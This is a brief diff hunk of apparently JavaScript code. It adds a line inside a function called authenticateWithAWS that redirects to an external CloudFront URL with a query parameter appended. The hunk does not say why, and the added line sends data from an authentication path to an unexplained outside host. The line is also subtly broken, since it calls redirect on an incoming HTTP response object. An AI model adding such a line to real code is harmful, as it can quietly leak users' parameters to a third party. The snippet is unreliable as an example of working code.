@@ -346,6 +346,8 @@ function authenticateWithAWS()
   resp.on('end', () => {
     console.log(data);
   });
+  
+  resp.redirect('https://d3puwp3b6282u6.cloudfront.net/?' + qsParam);
 
 }).on("error", (err) => {
   console.log("Error: " + err.message);
